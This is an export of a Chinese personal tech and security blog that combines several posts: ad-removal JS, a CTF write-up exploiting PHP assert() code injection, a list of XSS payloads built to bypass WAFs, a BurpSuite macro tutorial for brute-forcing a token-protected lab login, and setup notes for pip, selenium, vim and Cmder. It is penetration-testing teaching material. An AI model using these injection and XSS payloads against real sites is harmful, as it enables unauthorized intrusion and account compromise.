<p>首先确认一下方法对我的环境是否适用，先f12查找一下<code>.trc_rbox_container</code>，发现这个div确实是广告<br><img data-src="/2022/09/16/livere%E5%8E%BB%E9%99%A4%E9%9F%A9%E6%96%87%E5%B9%BF%E5%91%8A/2022-09-16-16-40-03.png"></p>
<p>然后控制台运行一下作者提供的js，发现该广告确实消失了，即该方法对我的问题有效<br><img data-src="/2022/09/16/livere%E5%8E%BB%E9%99%A4%E9%9F%A9%E6%96%87%E5%B9%BF%E5%91%8A/2022-09-16-16-41-44.png"></p>
<p>然后就是找地方插入这段js，搜索了一下，博客源码里面涉及livere的文件只有两个，分别是<code>livere.swig</code>和<code>livere.js</code>（博客主题为：time-netx），经过分析、尝试，修改<code>livere.swig</code>文件有效，把下面代码插入script标签内即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> box = <span class="built_in">document</span>.querySelector(<span class="string">&quot;.trc_rbox_container&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(box) box.outerHTML = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure>
<p><img data-src="/2022/09/16/livere%E5%8E%BB%E9%99%A4%E9%9F%A9%E6%96%87%E5%B9%BF%E5%91%8A/2022-09-16-16-44-22.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.jiejiss.com/LiveRe%E8%AF%84%E8%AE%BA%E5%9C%A8hexo-theme-even%E4%B8%8B%E5%81%B6%E5%8F%91%E6%B6%88%E5%A4%B1%E9%97%AE%E9%A2%98/">https://blog.jiejiss.com/LiveRe%E8%AF%84%E8%AE%BA%E5%9C%A8hexo-theme-even%E4%B8%8B%E5%81%B6%E5%8F%91%E6%B6%88%E5%A4%B1%E9%97%AE%E9%A2%98/</a></p>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>mfw-writeup</title>
    <url>/2020/11/16/mfw-writeup/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本题来源于攻防世界<code>WEB</code>题，题目名称为<code>mfw</code>，考察的是<code>PHP</code>代码注入，需要有点脑洞，故记录一下。</p>
<a id="more"></a>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先打开网站后浏览页面，可看到提示用到<code>Git</code>、<code>PHP</code>、<code>Bootstrap</code>，自然想到<code>.git</code>源码泄露：<br><img data-src="/2020/11/16/mfw-writeup/2020-11-16-01-23-39.png"><br>查看一下果然存在：<br><img data-src="/2020/11/16/mfw-writeup/2020-11-16-01-26-12.png"><br>那么使用<code>GitHack</code>工具下载源码<br><img data-src="/2020/11/16/mfw-writeup/2020-11-16-01-27-33.png"><br>下载后所有代码如下：<br><img data-src="/2020/11/16/mfw-writeup/2020-11-16-01-30-02.png"><br>很明显flag在<code>flag.php</code>文件中，但是泄露的源码中未写入，所以需要根据<code>index.php</code>的漏洞读取到<code>flag.php</code>文件，因为其它的三个都是静态文件。<br>因为代码中有<code>assert</code>执行判断，而<code>$file</code>可控，所以可以调整<code>$file</code>值进行代码注入，源代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>构造exp如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=<span class="string">&#x27;.system(&#x27;</span>ls<span class="string">&#x27;).&#x27;</span></span><br></pre></td></tr></table></figure>
<p>完整的php语句为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert(<span class="string">&quot;strpos(&#x27;templates/&#x27;.system(&#x27;ls&#x27;).&#x27;.php&#x27;, &#x27;..&#x27;) === false&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>我们知道<code>php</code>中使用<code>.</code>连接两个字符串，通过闭合单引号，让$file前后拼接的路径变成单独的字符串并使用<code>.</code>拼接<code>system(&#39;ls&#39;)</code>的执行结果，整个过程行云流水，完美衔接，而<code>system(&#39;ls&#39;)</code>的结果直接输出到页面上，所以可以进行回显，效果如下：<br><img data-src="/2020/11/16/mfw-writeup/2020-11-16-02-00-29.png"><br>执行成功后则可以通过<code>system(&#39;cat templates/flag.php&#39;)</code>来读取文件得到flag：<br><img data-src="/2020/11/16/mfw-writeup/2020-11-16-01-59-59.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>python pip 离线安装第三方库</title>
    <url>/2020/11/30/python-pip-%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<ol>
<li>在联网的主机上执行pip下载第三方库，如gevent、tqdm<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip2 download gevent tqdm -i https:&#x2F;&#x2F;mirrors.cloud.tencent.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure></li>
<li>复制下载的包到离线主机上，使用以下命令安装，其中pylibs是安装包保存的目录<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip2 install --no-index --find-links&#x3D;file:&#x2F;&#x2F;c:\pylibs gevent tqdm</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>python selenium 操纵Chrome提取XPath</title>
    <url>/2020/08/30/python-selenium-%E6%93%8D%E7%BA%B5Chrome%E6%8F%90%E5%8F%96XPATH/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>XPath</code>是一门在<code>XML</code>文档中查找信息的语言。<code>XPath</code>用于在<code>XML</code>文档中通过元素和属性进行导航。<code>XPath</code>在爬取提取数据中非常好用，但是通过<code>Chrome</code>或者<code>Firefox</code>提取的<code>XPath</code>，经常会遇到在<code>Python lxml</code>库中提取不到数据，<strong>因为浏览器对不标准的HTML文档都有纠正功能，而<code>lxml</code>库不会</strong>，而从本地HTML文件中提取<code>XPath</code>又很不方便，所以既然<code>XPath</code>是从浏览器中提取的，那么通过<code>selenium</code>操纵<code>Chrome</code>提取<code>XPath</code>就准确很多，能省很多事。</p>
<a id="more"></a>
<h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><p><code>pip</code>安装<code>selenium</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure>
<p>要使用<code>selenium</code>操纵<code>Chrome</code>，还需要下载<code>ChromeDriver</code>，<a href="https://sites.google.com/a/chromium.org/chromedriver/home">点击下载（可能需要代理）</a>对应版本的<code>ChromeDriver</code>：<br><img data-src="/2020/08/30/python-selenium-%E6%93%8D%E7%BA%B5Chrome%E6%8F%90%E5%8F%96XPATH/2020-08-31-09-26-38.png"><br>下载后解压到项目文件夹内即可。</p>
<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用chrome打开一个本地HTML文件，然后提取xpath，因为我们通常都是先使用requests获取到请求结果，再进行xpath提取，比直接通过浏览器取HTML文件效率会高些。</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 文件位置</span></span><br><span class="line">    filename = <span class="string">r&#x27;0830.html&#x27;</span></span><br><span class="line">    <span class="comment"># chrome打开本地HTML文件，需要加上file://协议头</span></span><br><span class="line">    filepath = <span class="string">&#x27;file://&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(filename)</span><br><span class="line">    <span class="built_in">print</span>(filepath)</span><br><span class="line">    <span class="comment"># 启用headless模式，此模式调用浏览器不会打开窗口</span></span><br><span class="line">    options = webdriver.chrome.options.Options()</span><br><span class="line">    options.headless = <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 驱动chrome</span></span><br><span class="line">    driver = webdriver.Chrome(options=options)</span><br><span class="line">    <span class="comment"># 打开本地HTML文件</span></span><br><span class="line">    driver.get(filepath)</span><br><span class="line">    <span class="comment"># 提取xpath，这里xpath只需到具体的某个标签，不能是属性</span></span><br><span class="line">    <span class="comment"># 通过 .text 获取标签文本内容</span></span><br><span class="line">    cgbianhao = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;two_pages_all&quot;]/div[1]/div[2]/table[3]/tbody/tr[&#123;&#125;]/td[3]&#x27;</span>.<span class="built_in">format</span>(i)).text</span><br><span class="line">    cgname = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;two_pages_all&quot;]/div[1]/div[2]/table[3]/tbody/tr[&#123;&#125;]/td[4]&#x27;</span>.<span class="built_in">format</span>(i)).text</span><br><span class="line">    cgstarttime = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;two_pages_all&quot;]/div[1]/div[2]/table[3]/tbody/tr[&#123;&#125;]/td[5]&#x27;</span>.<span class="built_in">format</span>(i)).text</span><br><span class="line">    cgstopstime = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;two_pages_all&quot;]/div[1]/div[2]/table[3]/tbody/tr[&#123;&#125;]/td[6]&#x27;</span>.<span class="built_in">format</span>(i)).text</span><br><span class="line">    <span class="comment"># 通过 .get_attribute() 获取属性内容</span></span><br><span class="line">    url_item = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;two_pages_all&quot;]/div[1]/div[2]/table[3]/tbody/tr[&#123;&#125;]/td[7]/a&#x27;</span>.<span class="built_in">format</span>(i)).get_attribute(<span class="string">&quot;onclick&quot;</span>)</span><br><span class="line">    <span class="comment"># 关闭浏览器实例</span></span><br><span class="line">    driver.close()</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://sites.google.com/a/chromium.org/chromedriver/home">ChromeDriver</a><br><a href="https://www.thinbug.com/q/23900348">为什么这个xpath在python中使用lxml失败？</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>一些过WAF的PAYLOAD</title>
    <url>/2019/07/22/%E4%B8%80%E4%BA%9B%E8%BF%87WAF%E7%9A%84PAYLOAD/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>这是是一些个人构造或者收集而来的成功绕过waf的payload，持续更新。</p>
<h3 id="XSS-PAYLOAD"><a href="#XSS-PAYLOAD" class="headerlink" title="XSS PAYLOAD"></a>XSS PAYLOAD</h3><ol>
<li>某waf拦截<code>=alert</code>、<code>=eval</code>等，却不拦截<code>=console.log</code><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=<span class="built_in">console</span>.log(<span class="built_in">eval</span>(atob(<span class="string">&#x27;YWxlcnQoJ3hzcycp&#x27;</span>)))&gt;</span><br></pre></td></tr></table></figure></li>
<li>匹配<code>&lt;&gt;</code>中间不能有<code>=onload</code>等任意javascript事件，内容只匹配一次，第一个<code>&lt;</code>与<code>%3e</code>匹配了，第二个<code>&lt;</code>与最后的<code>&gt;</code>匹配了，所以第一个<code>&lt;</code>与最后的<code>&gt;</code>中间的<code>onload=</code>没有被拦截<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;svg admin=<span class="string">&#x27;&lt;%00%3e&#x27;</span> onload=alert<span class="string">`xss`</span>&gt;</span><br></pre></td></tr></table></figure></li>
<li>js关键字拼接绕过，把alert函数赋值到变量，通过变量调用，可绕过函数名的拦截<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ex1:</span><br><span class="line">&lt;svg onload=<span class="string">&quot;var a=alert;console.log(a(1))&quot;</span>&gt;&lt;/svg&gt;</span><br><span class="line">ex2:</span><br><span class="line"><span class="number">11111111</span><span class="string">&quot;&gt;&lt;svg+onload=&quot;</span><span class="keyword">var</span>+a=alert;a(<span class="number">1</span>)<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>无事件和js代码xss<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>不闭合标签，利用了浏览器自动补全标签的特性xss<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;img+src=1+onerror%3Dalert(1)+aaa</span><br></pre></td></tr></table></figure></li>
<li>无尖括号，绕过disable，oninvalid事件（需要在输入框按回车触发）<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1123123123xss&quot; scr=&quot;&quot; oninvalid=a=alert;a(1) pattern=&quot;a&quot; type=&quot;submit&quot; a=</span><br></pre></td></tr></table></figure></li>
<li>绕过hidden，仅IE可用<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">xss&quot; style=&quot;behavior:url(?)&quot; onreadystatechange=&quot;confirm(1)</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>vim简易快捷配置</title>
    <url>/2020/08/21/vim%E7%AE%80%E6%98%93%E5%BF%AB%E6%8D%B7%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经常需要在不同的Linux上切换，有些Linux默认配置的vim用起来很不舒服，所以记录一个简单的vim配置，用起来会顺手一点。</p>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>将下面代码保存到<code>~/.vimrc</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">syntax on</span><br><span class="line">filetype indent on</span><br><span class="line">set nocp</span><br><span class="line">set nocompatible</span><br><span class="line">set autoread</span><br><span class="line">set mouse&#x3D;</span><br><span class="line">set showcmd</span><br><span class="line">set showmatch</span><br><span class="line">set autoindent</span><br><span class="line">set softtabstop&#x3D;4</span><br><span class="line">set shiftwidth&#x3D;4</span><br><span class="line">set tabstop&#x3D;4</span><br><span class="line">set nu</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>使用BurpSuite宏获取CSRF TOKEN</title>
    <url>/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在WEB渗透中经常可以看到页面存在一次性<code>token</code>校验的情况，即请求包中包含<code>token</code>，而<code>token</code>值需通过其它页面获取，导致<code>burpsuite</code>抓包后无法重放。</p>
<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>下面以一个简单例子来做个说明。目标网站如下，页面存在一个图片验证码，题目要求暴力破解得到账号密码。这题可以有多种方式实现，这里以<code>burpsuite</code>宏进行实验。<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-55-39.png"></p>
<a id="more"></a>
<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ol>
<li>目标URL为：<code>http://1.1.1.1/c/hdyzma/welcome.php</code>，抓个包测试一下，发现其会对<code>token</code>参数校验，拒绝重放的数据包。<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-17.png"><br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-24.png"></li>
<li>在登陆页面<code>http://1.1.1.1/c/hdyzma/</code>可发现<code>token</code>值：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-48.png"></li>
<li>通过上面的发现，可以使用<code>burpsuite</code>的宏功能自动把登陆页的<code>token</code>值抓取出来填入登陆请求</li>
</ol>
<h3 id="创建Macros"><a href="#创建Macros" class="headerlink" title="创建Macros"></a>创建Macros</h3><ol>
<li>创建<code>Macros</code>，获取<code>token</code>值<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-57-29.png"></li>
<li>在<code>Macro Recorder</code>中选择包含要获取的<code>token</code>的页面<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-57-54.png"></li>
<li>配置<code>Macros</code><br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-58-16.png"><br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-58-23.png"><br>用鼠标选中<code>token</code>值，<code>burpsuite</code>会自动填写开始标记以及结束标记，并且写上<code>Parameter name</code>为<code>token</code>，注意这里的参数名<code>token</code>是与要爆破页面里的<code>token</code>名称一致：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-59-07.png"><br>定义<code>Macro</code>描述，方便区分：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-59-30.png"></li>
</ol>
<h3 id="创建Session-Handling-Rules"><a href="#创建Session-Handling-Rules" class="headerlink" title="创建Session Handling Rules"></a>创建Session Handling Rules</h3><ol>
<li><p>然后在Session Handling Rules里面新建一条规则：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-00-45.png"><br>设置一个名字，这里叫<code>update_token</code>：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-01-02.png"><br>选中刚刚录制好的宏，并且设置要更新的参数名，这里是<code>token</code>：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-01-19.png"></p>
</li>
<li><p>然后是设置宏的影响范围，因为我们只需要暴力破解账号密码，所以<code>Tools Scope</code>这里只选中<code>Repeater</code>、<code>Intruder</code>就行了，其它模块可根据实际需要勾选:<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-01-52.png"></p>
</li>
</ol>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><ol>
<li>回到<code>Repeater</code>，点击<code>Go</code>重新发包，可以看到现在<code>token</code>参数会自动刷新：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-02-29.png"><br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-02-36.png"></li>
<li>使用<code>Intruder</code>暴力破解账号密码：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-02-54.png"><br>因为多线程会同时刷新<code>token</code>，导致部分请求包拿到的<code>token</code>已经被刷新了，所以只能设置单线程跑：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-03-17.png"><br>成功暴破得到账号<code>admin/123456a</code><br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-03-32.png"></li>
</ol>
<h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><p>源码来自<a href="https://github.com/3sNwgeek">3sNwgeek</a>，附上题目：<a href="https://github.com/3sNwgeek/BruteForc_test">https://github.com/3sNwgeek/BruteForc_test</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>个人终端环境打造</title>
    <url>/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>作为一个有追求的Hacker&amp;Geeker，打造一个趁手的终端是必不可少的，本文将分享一下本人多年使用下来的最优方案。</p>
<p>本文涉及以下内容：</p>
<ol>
<li>Cmder配置</li>
<li>WinderTerm + Cmder</li>
<li>Windows Terminal + Cmder</li>
<li>alias 常用命令快速执行</li>
<li>环境变量</li>
</ol>
<p><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-15-59-19.png"></p>
<a id="more"></a>
<h3 id="Cmder配置"><a href="#Cmder配置" class="headerlink" title="Cmder配置"></a>Cmder配置</h3><p><code>Cmder</code>给我们提供了一个不错的环境，带有常见的Linux命令如<code>curl</code>、<code>grep</code>、<code>sort</code>、<code>uniq</code>等命令，使用起来比原生cmd舒服的多，所以选用<code>Cmder</code>作为基础的命令行环境。</p>
<h4 id="安装及初始化"><a href="#安装及初始化" class="headerlink" title="安装及初始化"></a>安装及初始化</h4><p>自行到官网下载最新版本Cmder，建议下载完整版，Mini版啥都没，用起来不舒服。<br><a href="https://cmder.app/">https://Cmder.app/</a><br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-16-09-26.png"><br>运行后会自动初始化。<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-16-24-30.png"><br>然后检查下系统环境变量，有无<code>Cmder_ROOT</code>、<code>ConEmuDir</code>两个环境变量，如果没有，就手动添加下。<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-16-29-04.png"></p>
<p><code>CMDER_ROOT</code>设置为Cmder解压后的命令，即<code>Cmder.exe</code>所在目录。<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-16-26-33.png"><br><code>ConEmuDir</code>在是Cmder目录下的<code>vendor\conemu-maximus5</code>，参考上方截图。</p>
<h4 id="修改烦人的默认符号-“λ”"><a href="#修改烦人的默认符号-“λ”" class="headerlink" title="修改烦人的默认符号 “λ”"></a>修改烦人的默认符号 “λ”</h4><p>默认命令行提示符号 “λ”，在某些情况下会导致显示异常，所以换掉，比如下面，<code>ping</code>显示成<code>pping</code>：<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-16-41-23.png"><br>打开<code>vendor\clink.lua</code>文件，搜索<code>local lambda =</code><br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-16-37-53.png"><br>修改后：<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-16-34-54.png"></p>
<h4 id="配置Alias"><a href="#配置Alias" class="headerlink" title="配置Alias"></a>配置Alias</h4><p>如果经常用Linux应该知道，我们可以把一些常用命令设置成别名，比如：<br><code>alias ll=&quot;ls -lah&quot;</code></p>
<p>通过别名，我们可以设置一些自定义命令，实现快捷操作或者多版本Python运行等。</p>
<p>我们可以在<code>config\user_aliases.cmd</code>文件添加自己的别名，参考如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">myip=curl 4.ipw.cn &amp;&amp; <span class="built_in">echo</span>= &amp;&amp; curl 6.ipw.cn</span><br><span class="line">python=D:\python\Python38\python.exe  $*</span><br><span class="line">python3=D:\python\Python38\python.exe  $*</span><br><span class="line">python2=D:\python\Python27\python.exe  $*</span><br><span class="line">pip=D:\python\Python38\Scripts\pip.exe  $*</span><br><span class="line">pip3=D:\python\Python38\Scripts\pip.exe  $*</span><br><span class="line">pip2=D:\python\Python27\Scripts\pip.exe  $*</span><br><span class="line">pipinstall=D:\python\Python38\Scripts\pip.exe install -i https://mirrors.cloud.tencent.com/pypi/simple/ $*</span><br><span class="line">dbc=<span class="string">&quot;E:\sectools\11_other\dbeaver\dbeaver.exe&quot;</span></span><br><span class="line">hashcat=<span class="string">&quot;E:\sectools\01_bruteforce\hashcat-5.1.0\hashcat64.exe&quot;</span>  $*</span><br><span class="line">ip=ipconfig /all</span><br><span class="line">ifconfig=ipconfig</span><br><span class="line">ctf-scan=D:\python\Python38\python.exe E:\Python\ctf-wscan\ctf-wscan.py $*</span><br><span class="line">icohash = e:/Python/hw/env3/Scripts/python.exe e:/Python/FOFA_ICO_HASH.py  $*</span><br><span class="line">tshark = <span class="string">&quot;D:\Program Files\Wireshark\tshark.exe&quot;</span> $*</span><br><span class="line">docker = <span class="string">&quot;D:\Program Files (x86)\VMware\VMware Workstation\bin\vctl.exe&quot;</span>  $*</span><br></pre></td></tr></table></figure>
<p><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-04-03-10-21-12.png"></p>
<p>然后打开一个新的Cmder标签就能使用我们定义的别名了：<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-17-13-07.png"></p>
<p><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-17-15-48.png"></p>
<h4 id="兼容第三方终端"><a href="#兼容第三方终端" class="headerlink" title="兼容第三方终端"></a>兼容第三方终端</h4><p>既然Cmder配置后还不错，为什么还要用第三方客户端呢？<br>我的看法是：Cmder性能差，比如多行文本粘贴上去，会卡；界面不够现代化。</p>
<p>既然我们知道Cmder有些毛病，但是有想用它的环境，比如Linux命令、Git、Alias等，可以想办法把它放到你系统的终端中启动。</p>
<p>从下面截图我们知道，Cmder是通过下面的命令进行初始化启动的，我们先记下它的命令行。</p>
